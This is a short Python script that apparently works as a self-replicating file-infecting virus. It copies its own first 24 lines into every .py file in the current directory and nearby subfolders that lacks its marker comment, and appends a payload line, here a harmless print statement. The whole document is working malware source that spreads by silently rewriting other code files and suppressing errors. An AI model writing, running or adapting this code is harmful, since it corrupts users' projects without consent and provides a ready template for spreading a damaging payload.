# qwertyui
import os, sys
sclines = open(sys.argv[0]).readlines()[:24]
SELF_CONTENT = ""
PAYLOAD = r"print('PAYLOAD')"
for i in sclines:
    SELF_CONTENT += i
def artgv_folder(path, level):
    files = os.listdir(path)
    for i in files:
        j = f"{path}/{i}"
        if os.path.isdir(j) and level < 2:
            artgv_folder(j, level+1)
        if j.split(".")[-1] == "py":
            try:
                content = open(j).read()
            except Exception:pass
            if content.split("\n")[0] != "# qwertyui":
                try:
                    with open(j, "w") as handle:
                        handle.write(f"{SELF_CONTENT}\n\n\n{content}\n{PAYLOAD}")
                except Exception:
                    pass
artgv_folder(os.getcwd(), 1)
